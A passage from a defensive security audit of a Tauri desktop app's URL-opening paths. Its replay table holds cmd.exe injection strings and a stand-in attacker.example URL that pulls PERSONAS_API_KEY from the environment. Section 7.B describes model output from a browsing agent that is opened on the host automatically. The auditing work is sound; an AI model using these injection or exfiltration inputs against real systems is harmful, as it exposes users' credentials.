…rendered by the markdown `a` override as a **`<button>` that is `disabled` when the sanitizer
returned `null`** — so the affordance's existence tracks the URL's validity, and the click reaches
a door that is actually connected to something. It is the only idiom in `src/` where all three of
those properties hold at once.

*(Copy it without its last two lines: both `InteractiveSetupInstructions.tsx:80-83` and
`StepActions.tsx:36-38` follow the `await` with `catch { window.open(safe, '_blank', …) }`, a
fallback that is unreachable-by-suppression and, if it ever worked, would route around the backend
validation at the exact moment the backend said no.)*

### The two doors, and everything that reaches for a third

Whole-tree, comment-only lines excluded, both by an independent scanner and by the census engine:

```
WIRED (16 call sites)
  13  openExternalUrl(…)      12 files    ← 6 sanitized, 7 not
   2  openLocalPath(…)         1 file     ← 0 sanitized
   1  (test)

UNWIRED (46 sites, 40 files)
  32  <a target="_blank">     28 files    ← 28 with rel=…noopener, 4 with noreferrer only, 0 with no rel
   8  window.open(             7 files    ← 5 sanitized, 3 not; a 9th occurrence is a comment
   6  '@tauri-apps/plugin-shell' imports  6 files → 7 open() calls
```

The three tokens were also counted **separately** and re-summed as a second implementation:
`32 + 8 + 6 = 46`, and `28 + 7 + 6 = 41` files collapsing to **40** because
`overview/components/health/InstallButton.tsx` carries both an anchor (`:86`) and a
`window.open` (`:116`) — two mechanisms for the same button, neither of which works.

The `<a>` figures come from a tag parser, not a line grep: **36 `<a>` opening tags exist in the
whole tree and 32 carry `target="_blank"`.** A line-based count would have missed the multi-line
ones, which are the majority.

### The runtime chain, and the live probe

```
window.open('about:blank','_blank')  ->  null        (pid 29284, 2026-08-16, via /eval + /query)
```

Read bottom-up, the reason is one `else` branch in a vendored crate:

```rust
// wry-0.55.1  src/webview2/mod.rs:779-782
        } else {
          args.SetHandled(true)?;      // handled, and no SetNewWindow -> nothing opens
        }
```

reached because `tauri-runtime-wry-2.11.2 lib.rs:4907` guards the whole handler installation behind
`if let Some(new_window_handler) = pending.new_window_handler`, and `tauri-2.11.2`
`webview/mod.rs:354,:433` initialise that field to `None` with `.on_new_window` (`:589`) the only
setter — **called nowhere in this repo, and nowhere in `vibeman` either.** `webkitgtk/mod.rs:487`
and `wkwebview/class/wry_web_view_ui_delegate.rs:147` are the same `if let Some`, so this is not a
Windows quirk. The anchor case shares this exact event; the direct evidence is the `null`.

Corroboration from inside the repo, written by someone who hit it and worked around it rather than
reporting it — `overview/sub_messages/…/MessageDetailModal.tsx:327-332`:

> *"Tauri's webview doesn't reliably honour `window.open('', '_blank')` — it either returns null or
> routes the URL to the system browser … The reliable alternative is an off-screen iframe with
> `srcdoc`."*

### What `open::that` is, executed

`open-5.3.3 src/windows.rs:10-18` — and `shellexecute-on-windows` is off, confirmed by `dunce`'s
absence from `open`'s dependency list in `Cargo.lock:4943-4947`:

```
cmd /c start "" "<url>"
```

Replayed with `echo` substituted for `start`, so nothing launched, via `windowsVerbatimArguments`
to reproduce Rust's `raw_arg` byte-for-byte:

| input | result |
|---|---|
| `https://example.com/path?a=b` | round-trips; no second command |
| `https://example.com/x"&echo INJECTED_AMP&"` | **`INJECTED_AMP` executed** |
| `https://example.com/x"\|echo INJECTED_PIPE&"` | **`INJECTED_PIPE` executed** |
| `https://example.com/%CD%` | expanded to the process working directory |
| `https://attacker.example/collect?k=%PERSONAS_API_KEY%&u=%USERNAME%` | **both substituted from the process environment** |

And the two guards, measured against the same inputs:

| | `"` breakout | `%VAR%` expansion |
|---|---|---|
| `open_external_url`'s `starts_with` | not blocked | not blocked |
| `sanitizeExternalUrl` (`→ new URL(x).href`) | **blocked** — `"` → `%22` | **not blocked** — `href === input`, byte for byte |
| `url::Url::parse` (the obvious type fix) | blocked | **not blocked** — same grammar |
| `open::that_detached` + `shellexecute-on-windows` | **blocked** — no command line exists | **blocked** — no command line exists |

`std::env::set_var("PERSONAS_API_KEY", &key)` at `lib.rs:1744` runs unconditionally in `setup`, and
`std::process::Command` inherits the parent environment by default.

### URL provenance, from the live databases

Read-only copies, 2026-08-16, `personas.db` 244 tables / `personas_data.db` 71:

- **`connector_definitions`: 134 rows; 185 URLs across `metadata` + `resources`; 185 of 185
  `https`.** Zero `http`, zero other schemes, zero private hosts. Keys: `docs_url` 123, `url` 50,
  `oauth_scopes` 11, `OBSIDIAN_API_URL` 1. **The catalog that feeds `ConnectorCredentialModal`'s
  `setup_url` anchor and `AutoCredConsent`'s `ctx.docsUrl` is clean** — which is why the
  unsanitized call sites there have never misfired, and is not a property anything enforces.
- **`dev_projects`: 14 rows, `test_env_url` set on 0 of them.** So `execute_open_test_env` — the
  model-mediated door, and the *correct* shape (§3) — has never had a URL to return on this
  install; every invocation returns its `AppError::Validation` hint. The best-designed path in this
  leaf is also the only one that has never run. (Same shape as
  [outbound-http-call](./outbound-http-call.md)'s finding that all 7 polling triggers carry no
  `url` and its SSRF guard has never executed.)
- **`persona_executions`: 2,188 rows; 374 contain `://`; 858 URL tokens; 16 distinct hosts.**
  820 `https`, 5 `http`, plus 4 `gs:`, 2 `memory:`, 1 `builtin:`. Hosts are dominated by
  `github.com` (830) and include **`169.254.169.254` ×3, `localhost:11434` ×2, `evil.com`,
  `attacker.com`, `evil.example.com`** — all of them personas writing security findings about other
  codebases. **Stored model output routinely contains the exact hosts an SSRF guard exists to
  refuse.**

  > **A measurement artifact, reported because both implementations shared it.** A 7th "scheme",
  > `nhttps` (26 occurrences), appears in both counts. `output_data` is JSON, so a newline is the
  > two characters `\n`, and `\nhttps://` tokenises as `nhttps`. My second implementation added a
  > lookbehind for `[A-Za-z0-9+.\-]` and **still** matched, because the preceding character is a
  > backslash. Two implementations, one bug, exact agreement — the doctrine's "false agreement in
  > the same direction", caught only by looking at the token. The corrected https figure is 846.

### The inbound half: `personas://`, five routes, no origin

`tauri.conf.json` → `plugins.deep-link.desktop.schemes: ["personas"]`; `lib.rs:1684`
`register_all()`. The handler is `lib.rs:1622-1678`:

| Route | Reaches | Confirmation |
|---|---|---|
| `personas://auth/callback` | `handle_auth_callback` | CSRF `app_state` nonce |
| `personas://share?…` | `SHARE_LINK_RECEIVED` → `ShareLinkHandler.tsx:31` | the import dialog |
| `personas://import/<slug>` | `eventBridge.ts:866-890` → **`importPersonaFromGallery(slug)` immediately**, then a success toast | **none** |
| `personas://ref/<code>` | `captureReferrerOnce(code)` | **none** |
| `personas://pair?…` | `engine/src/pairing.rs:227` → approval modal | human approval — but **`origin` is read from the query string** |

Three of the five are matched with `starts_with`/`strip_prefix` rather than parsed. The share-link
listener is the one that gets it right — `redactUrlForLog` before `tracing`, with the reason at
`eventBridge.ts:850-852`: *"Share/import deep links can carry a capability token or slug in the
path/query."* The two doors that carry a **token** are careful; the two that carry a **slug** are
not, and only one of the four writes anything.

`resolve_share_deep_link` (`commands/network/bundle.rs:318`) is registered as an IPC command and has
**zero callers in `src/`** — the paste-a-link path the deep link was meant to complement.

---

## 7. Deviations found

> **Second pass — what is upstream of all of this.** Every defect below reduces to a single
> unasked question: **nobody checked what the destination actually is.** Downward, that produced 46
> affordances aimed at a mechanism the host does not implement. Upward, it produced two validated
> doors whose validation was written against "a URL" when the thing on the other side is a
> **command line**. The same omission, in both directions, from the same habit of reasoning about
> the string rather than about what receives it.

### 7.A — P0: the two working doors hand the URL to `cmd.exe`, and the process environment holds a vault-wide credential

| Path | Defect |
|---|---|
| `src-tauri/src/commands/infrastructure/system/mod.rs:28` | `open::that(trimmed)` → `cmd /c start "" "<url>"`. `%VAR%` expands; `"` breaks the quoting. |
| `…/system/mod.rs:71` | Same, for paths and four editor schemes. A filename containing `%` also mis-resolves. |
| `src-tauri/src/lib.rs:1744` | `std::env::set_var("PERSONAS_API_KEY", &key)` — the broad, non-expiring system key, in the environment every `cmd` child inherits. |
| `src-tauri/Cargo.toml:162` | `open = "5"` — `shellexecute-on-windows` not enabled, so the shell path is what compiles. |

**Reachability, ranked.** `%PERSONAS_API_KEY%` needs a URL the app will open. In descending order of
exposure: `TauriPlaywrightAdapter.ts:91` (model output, auto-fired, §7.B); `cloud.rs:824` (a remote
HTTP response, §7.C); `fleetTerminalManager.ts:226` (a URL detected in PTY output from a Claude CLI
subprocess — sanitized, which is not enough); `AutoCredBrowser.tsx:61` / `AutoCredLogEntries.tsx:48`
(URLs from a headless browser session against a third-party site). **The sanitizer does not close
it. The `Url` type does not close it.**

**Fix (one line, five sites, both channels, every caller):**

```toml
open = { version = "5", features = ["shellexecute-on-windows"] }
```

and `open::that` → `open::that_detached` at `system/mod.rs:28`, `:71`, `cloud.rs:824`,
`drive.rs:1420`, `:1459`. On Windows that becomes `ShellExecuteExW` with the target as a wide
string (`open-5.3.3 src/windows.rs:40-67`); on Unix it is already argv. **Then** make
`open_external_url` take `url::Url` and log through a redactor.

### 7.B — P0: a model's own output line is opened on the host, automatically, unsanitized

| Path | What it does |
|---|---|
| `src-tauri/src/commands/credentials/auto_cred_browser.rs:502`, `:543`, `:654`, `:672` | The prompt teaches the model the protocol: *"output: `OPEN_URL:https://the-url-here`"*, four times. |
| `…/auto_cred_browser.rs:939-956` | Finds `OPEN_URL:` anywhere in a line, takes to the next whitespace, checks the scheme prefix, emits `{"url": …, "auto_open": true}`. |
| `src/features/vault/sub_catalog/components/autoCred/helpers/TauriPlaywrightAdapter.ts:91` | `openExternalUrl(event.payload.url)` — **no `sanitizeExternalUrl`, no user gesture.** |
| `…/auto_cred_browser.rs:1-8` | The model is the Claude CLI with the Playwright MCP adapter, *"navigat[ing] the connector's dashboard"* — i.e. its context is a live third-party web page. |

**Fix:** sanitize at `TauriPlaywrightAdapter.ts:91`, drop `auto_open` to a click for any URL whose
host is not the connector's own, and parse in Rust with `url::Url` rather than the prefix check.
The structural fix is §2's rule: have the model emit an identifier the backend resolves —
`OPEN_URL:setup_page` for the connector whose session this is.

### 7.C — P0: three Rust OS-handoffs bypass the validated command; one has no validation at all

Every `open::that` in 963 files:

| Site | Argument | Guard |
|---|---|---|
| `commands/infrastructure/cloud.rs:824` | `resp.auth_url` — **from a remote HTTP response** | **none**, and `let _ =` discards the error |
| `commands/infrastructure/system/mod.rs:28` | caller string | scheme prefix |
| `…/system/mod.rs:71` | caller string | 4-scheme prefix allowlist **or** `Path::exists()` |
| `commands/drive.rs:1420` | `resolve_safe(root, rel)` + `exists()` | contained |
| `commands/drive.rs:1459` (Linux only) | same | contained |

`drive.rs:1437`/`:1445` and `dev_tools/competitions.rs:679-693` reveal a folder via
`Command::new("explorer"|"open"|"xdg-open").arg(path)` — **argv, no shell** — and are the correct
shape for this repo to standardise on.

**Fix:** `cloud.rs:824` must call the validated command (or at minimum `Url::parse` + an https
assertion) and must not discard its error; a user who clicks "connect" and sees nothing has no way
to tell a refused URL from a missing browser.

### 7.D — P1: 46 affordances that open nothing, in 40 files

The census baseline. Grouped by what the author reached for:

- **32 `<a target="_blank">`** in 28 files — including every external link in the GitLab plugin
  (`GitLabAgentList`, `GitLabDeployModal`, `GitLabPipelineViewer`, `JobRow`), all four research-lab
  literature panels, both `ConnectorCredentialModal` setup links, `CloudOAuthPanel`'s two "open the
  consent page" links, `DeploymentTable`, `DeploymentCard`, `TwinHero`, `FirstUseConsentModal`'s
  repository link, and `MarkdownRenderer.tsx:311` — **which is the `a` override for every rendered
  markdown surface in the app, **50 consumer files** (the count [rendering-untrusted-content](./rendering-untrusted-content.md) recorded as 49 on 2026-08-14).**
- **8 `window.open(`** in 7 files — 4 of them `catch` fallbacks behind the door that works
  (`InteractiveSetupInstructions.tsx:82`, `StepActions.tsx:37`, `useOAuthPolling.ts:225`) plus
  `NotificationCenter.tsx:225,:295`, `IssueListWidget.tsx:76`, `InstallButton.tsx:116`,
  `PersonaRunner.tsx:110`.
- **7 `plugin-shell` `open()` calls** in 6 files — `GalleryPage.tsx:159` (open artist folder),
  `MediaStudioPage.tsx:584,:587` (open exported file / folder), `ProjectOverviewPage.tsx:249`
  (open repo), `PrBridge.tsx:326` (open PR), `WikiFreshnessPill.tsx:108` (open wiki dir),
  `PendingAuthModal.tsx:58` (OAuth consent — component never rendered).

`useOAuthPolling.ts:216-232` is the one that shows the cost most clearly: it tries the door, then
tries `window.open`, then throws *"Could not open … consent page. Please allow popups or external
browser open."* — advice for a browser, in an app with no popup blocker, about a fallback that
cannot work.

**Fix:** replace each with a `<button>` calling `openExternalUrl` — or, if the team wants anchors
back, install a single `.on_new_window` handler in Rust that routes the URL to the same validated
command, which converts all 40 at once and is the better trade.

### 7.E — P2: the doors log the URL whole

`system/mod.rs:26` — `tracing::info!(url = %trimmed, "open_external_url requested")` — and `:69` the
same for `open_local_path`. What flows through: OAuth authorize URLs carrying `client_id`, `state`
and `code_challenge` (`commands/credentials/oauth.rs:614-626`, reached via
`useOAuthPolling.ts:219`), connector setup URLs, share links. The repo owns `redactUrlForLog`
(`eventBridge.ts:1024`) and states the doctrine at `api_proxy.rs:884` — *"dynamic base URLs can
embed a secret in the path … `reqwest::Error`'s `Display` would leak it."* Neither reaches here.

### 7.F — P2: two `personas://` routes write without confirmation, and one takes its origin from the caller

`lib.rs:1648` — `personas://import/<slug>` → `eventBridge.ts:866-890` → `importPersonaFromGallery`
→ persona list refresh → success toast. `lib.rs:1657` — `personas://ref/<code>` →
`captureReferrerOnce`. **Any web page the operator visits can navigate to either.** And
`engine/src/pairing.rs:227-251` reads `origin` from the deep link's own query string, twenty lines
above the HTTP door that documents the opposite rule (`:266-269`).

*Authorization on that transport belongs to [second-transport-exposure](./second-transport-exposure.md);
what belongs here is that the transport is a **URL**, so its caller set is "everything that can
render a link", and three of five routes never parse it.*

### 7.G — P3: sanitizer adoption is 6 of 13 at the outbound door, 0 of 2 at the local door

Unsanitized outbound: `applyClientAction.ts:75` (`action.url` — safe today only because
`execute_open_test_env` resolves it from a row), `ProjectManagerPage.tsx:346`
(`project.testEnvUrl!`), `StationPicker.tsx:237`, `SmeeRelayTab.tsx:176,:320` (literals — fine),
`AutoCredConsent.tsx:28`, `TauriPlaywrightAdapter.ts:91` (§7.B). Unsanitized local:
`ProjectManagerPage.tsx:356` — `openLocalPath(\`vscode://file/${project.path}\`)`, a template
literal into an allowlisted scheme, and `:365`.

Contained today by the backend scheme check and by clean data (185/185 connector URLs are https).
Neither is a guarantee, and neither addresses §7.A.

---

## 8. Gaps — what the primitives genuinely cannot do

1. **`sanitizeExternalUrl` cannot protect a shell, and should not be asked to.** Its scheme check is
   correct, its bidi/zero-width rejection is unusually good, and its `"`-encoding is a side effect of
   returning `href`. Asking it to also escape `cmd.exe` metacharacters would be asking a URL
   validator to know what its consumer is — the definition of a leaky abstraction. **The launcher is
   the right layer**, which is why §4 step 6 is where the fix goes.
2. **No URL grammar can express `%VAR%`.** `%` is legal, `%CD%` is legal, and both `new URL()` and
   `url::Url::parse` round-trip it unchanged (measured). This is a genuine limitation and the reason
   this leaf's answer is a launcher change and not a type.
3. **`sanitizeExternalUrl` deliberately allows private and loopback hosts, and that is defensible.**
   `isBlockedHostname` is applied by `sanitizeIconUrl` (an SSRF surface — *we* fetch it) and not by
   `sanitizeExternalUrl` (*the user's browser* fetches it, and `http://192.168.1.1/` is a legitimate
   thing to want to open). The asymmetry is correct and undocumented; the file header says the
   blocklist is "for images" and nothing says why.
4. **The census cannot assert the absence that matters most.** "No URL reaches an OS handler without
   being parsed" is a statement about a data-flow, not a count. The rule in §9 counts a different,
   countable thing. Closing the flow needs the launcher change (§7.A) and the identifier-not-URL rule
   (§2), neither of which a ratchet can express.
5. **Nothing can tell you an affordance is dead except running it.** The 46 sites in §7.D are
   type-correct, lint-clean, accessible, and correctly `rel`-annotated. Every static tool in this
   repo approves of them. **The only instrument that saw the defect was a live probe**, and §9's
   signal is a proxy for its result, not a rediscovery of it.
6. **`openLocalPath`'s existence check is TOCTOU-racy** and cannot not be — the path is checked and
   then handed to another process. Low value here (a local attacker who can win that race has better
   options), named so the next reader does not mistake it for a containment boundary.

---

## 9. The missing gate

**The condition:** *an outbound-URL affordance that reaches for a mechanism this build does not
implement.* It is a live-behaviour condition — measured by the probe in §0, not by reading — and the
signal below is a **proxy** for it, keyed on the three tokens that manifestation happens to wear in
this stack. **An adopting repo must not copy the pattern.** It must run its own equivalent of the
probe (does `window.open` return a window? does the native plugin's Rust half exist?) and then write
a signal against whatever its own dead mechanisms are. In a plain web app all three tokens are
*correct* and this rule would be actively harmful.

**Mechanism:** a census rule, run by `npm run census` (report) and `npm run census:check` (drift is
fatal). **Where it executes: `npm run check`** — `package.json`'s `check` script chains
`census:check` before `tsc --noEmit` and `eslint src/`, and that is the script the PR self-review
ritual in `.claude/CLAUDE.md` requires green before a branch leaves the box. It is **not** in
`lefthook.yml` and **not** in any `.github/workflows/*.yml`, which per the brief's calibration is
the point: the gate that matters is the one a human or agent actually runs, and `ci.yml` is red on
pre-existing failures.

**How it fails loudly if its own precondition is absent** — inherited from the runner, not
re-derived: the run **fails** when the walk sees fewer files than `floor` (4,000 against a measured
4,829 — "the matcher is broken, not the codebase clean"), when the rule matches zero files anywhere,
when an `exclude` entry goes stale, when the count rises, **and when the count drops without the
baseline being updated**. Surviving counts print on success.

**Allowlist:** none, deliberately. There is no legitimate `target="_blank"`, `window.open` or
`plugin-shell` import in this build; a site that needs an exemption needs the fix. The three
comment-only occurrences (`system.ts:39`, `errorRegistry.ts:29`, `MessageDetailModal.tsx:327` — all
prose *about* this problem) are handled by `ignoreCommentLines`, verified: the runner reports
*"3 match(es) ignored on comment-only lines."*

**The positive control partitions the population rather than reporting a ratio.** Both rules count
"a site that hands a URL outward"; the violating pattern counts the ones aimed at unwired
mechanisms, the control counts the ones aimed at the two wired doors. The two patterns are disjoint
by construction, and together they are the whole surface.

```json
{
  "id": "unwired-url-open-door",
  "goldenPath": "docs/concepts/golden-paths/external-url-opening.md",
  "roots": ["src"],
  "extensions": [".ts", ".tsx"],
  "signal": {
    "pattern": "target=\"_blank\"|(?<![.\\w$])window\\.open\\s*\\(|@tauri-apps/plugin-shell",
    "flags": "g",
    "ignoreCommentLines": true,
    "description": "An outbound-URL affordance routed through a door this build does not implement: `target=\"_blank\"` and `window.open()` are both suppressed because no `on_new_window` handler is installed (wry-0.55.1 src/webview2/mod.rs:781 sets SetHandled(true) with no new window; measured live: window.open -> null), and `@tauri-apps/plugin-shell` has no Rust crate in Cargo.lock and no `shell:` permission in capabilities/. The only wired doors are the `open_external_url` / `open_local_path` IPC commands."
  },
  "baseline": { "files": 40, "matches": 46 },
  "floor": 4000
}
```

```json
{
  "id": "unwired-url-open-door-positive-control",
  "goldenPath": "docs/concepts/golden-paths/external-url-opening.md",
  "roots": ["src"],
  "extensions": [".ts", ".tsx"],
  "signal": {
    "pattern": "(?<![.\\w$])open(?:ExternalUrl|LocalPath)\\s*\\(",
    "flags": "g",
    "ignoreCommentLines": true,
    "description": "POSITIVE CONTROL: the COMPLIANT half of the same population — a URL handed outward through the wired IPC door. Must be non-zero, and must not overlap the violating pattern."
  },
  "floor": 4000
}
```

**Validation, in a private scratch registry** (`--rules`, filename unique to this composer; the full
registry was **not** run, per the doctrine):

```
  rule                                       files  base  matches  base  walked  floor
  OK  unwired-url-open-door                     40    40       46    46    4829   4000
  OK  unwired-url-open-door-positive-control    13     —       16     —    4829   4000
      3 match(es) ignored on comment-only lines
```

**Second implementation:** the pattern was decomposed into its three alternatives and each run
separately — `target="_blank"` **32** in 28 files, `window.open(` **8** in 7, `@tauri-apps/plugin-shell`
**6** in 6. `32+8+6 = 46` ✓, and `28+7+6 = 41 → 40` files after the one file
(`InstallButton.tsx`) that carries two of them ✓. A third, independent scanner with its own
offset-preserving comment blanker and its own JSX tag parser produced the same 32 and 8.

**Two limits, stated so the next reader does not trip on them.**

1. **The `plugin-shell` arm should reach zero, and the census cannot express that.** The correct fix
   is `npm uninstall @tauri-apps/plugin-shell`, after which that alternative matches nothing and — per
   the runner's zero-match rule — a rule containing it fails structurally. **At that point split the
   rule: drop the third alternative and re-baseline at 40/40.** Do not baseline it at 0.
2. **The rule expires if the platform gains the affordance.** If someone installs a
   `.on_new_window` handler that routes to `open_external_url` (§7.D's better fix), `target="_blank"`
   stops being a defect and this rule must be **deleted**, not ratcheted. Its description names the
   `wry` line so a future reader can check whether that has happened.

**What this gate does NOT catch, named per the contract's fifth failure mode.** It ratchets arrival
at the door. It says nothing about whether the door is safe — and §7.A is precisely a door that is
not. `npm run check` will go green on a codebase where all 46 sites have been converted to
`openExternalUrl` and every one of them can still read the process environment. **The gate on the
destination's default is the launcher change, and it is not a ratchet; it is one line of
`Cargo.toml`.** Ship both, and ship that one first.

---

## 12. Corrections to the brief

The brief made five priming claims. **Two were right, two were the wrong frame, and one pointed at
the largest finding without knowing it.**

1. **"A shell-opened URL bypasses CSP entirely — establish that boundary early and precisely."**
   **Correct, and understated.** It is not only `shell.open`. **No directive in this app's CSP
   governs any of the four ways a URL leaves the renderer.** `connect-src` governs `fetch`/XHR/WS;
   `frame-src` governs the YouTube embed; `form-action` governs form posts. A `target="_blank"`
   anchor, a `window.open`, an `openExternalUrl` invoke and a `WebviewUrl::External` window are all
   outside every directive present. The CSP3 directive that would have covered navigation
   (`navigate-to`) was never shipped by browsers. So the correct statement is stronger than the
   brief's: **the CSP is not a partial control on this leaf, it is a zero control**, and the
   `api.crossref.org` fix that [outbound-http-call §7.A](./outbound-http-call.md) demanded has
   landed (`connect-src` now lists it) without changing anything here.

2. **"`url_safety.rs` has an SSRF predicate … does anything apply it to a URL being *opened*?"**
   **No — and after measuring it, the right answer is that nothing should.** The brief's framing
   treats that as a gap. It is not: `is_private_ip` exists to stop *us* connecting to a private
   address. When the user's own browser opens `http://192.168.1.1/`, that is the feature. The repo
   has already drawn this line correctly and silently — `isBlockedHostname` is wired into
   `sanitizeIconUrl` (we fetch it) and deliberately not into `sanitizeExternalUrl` (they fetch it) —
   and the only defect is that nothing says so (§8.3). **The prior path's 13-of-44 figure does not
   generalise to this leaf; the denominator here is zero and should be.**

3. **"Where do opened URLs come from — literals, config, connector definitions (134 rows), or model
   output? A URL from model output handed to `shell.open` is the sharp case."** **Right, and it is
   live: §7.B.** The measurements refine it in both directions. Connector definitions are **not** a
   risk — 185 of 185 stored URLs are https, and the one model-mediated door that resolves from that
   catalog (`execute_open_test_env`) is the **best-designed path in this document** and has **never
   run**, because 0 of 14 dev projects have a `test_env_url`. Meanwhile the sharp case is sharper
   than "handed to": `auto_cred_browser.rs` **teaches the model an output protocol for it** and
   `TauriPlaywrightAdapter.ts:91` fires it with `auto_open: true` and no sanitizer.

4. **"Tauri's `shell` allowlist / capabilities — what is actually permitted?"** **The question has
   no answer, and that is the finding.** There is no `shell` entry in either capability file and no
   `tauri-plugin-shell` in `Cargo.lock` — the plugin does not exist in this binary and never has.
   The brief expected a permissions audit; what the audit found is that **six files import a client
   for a plugin that was never installed**, two other files document that fact in prose, and nobody
   reconciled them across the whole history of the repo.

5. **"Whether `target="_blank"` links carry `rel="noopener"` (and whether that matters in a
   webview)."** **This is where the brief's own hedge turned out to be the headline.** The answer to
   the parenthetical is *no, it does not matter* — and the reason is not that webviews are lenient.
   **It is that `target="_blank"` does not open anything at all in this app**, on any desktop
   backend, and has not since the first commit. 28 of 32 anchors carry `rel="noopener"`; all 32
   carry some `rel`; and every one of those is a correct answer to a question this runtime never
   asks. The brief's instruction — *"let the measurement lead"* — is the only reason this was found:
   the `rel` audit was a five-minute job that produced a clean bill of health, and the *next*
   question (does the click do anything?) needed a live probe against a running app.

**And one correction to a sibling document.** [rendering-untrusted-content](./rendering-untrusted-content.md)
lists `<a target="_blank"> without rel — 0 of 32` in its headline table of cleared signals. The
count is exactly right and independently reproduced here. The row is nonetheless load-bearing in a
way its author could not have known: **it is 32 of 32 hygienic anchors, none of which opens a
window.** That path's own §"Supporting sites" already contains the correction, in the note that
`setupMarkdownComponents.tsx`'s button *"is the idiom that provably works … instead of relying on
webview `target="_blank"` behaviour"* — a sentence written from experience, one document away from
the finding, and never generalised. **The observation existed twice in this repo, in two files, in
two languages, and cost 46 defects because nobody turned it into a check.** That is the single
transferable lesson of this leaf, and it is the same one
[second-transport-exposure](./second-transport-exposure.md) reached from a different direction:
*the recurring failure is not a missing check — it is a check that lives in a comment where an
import, or a gate, belongs.*
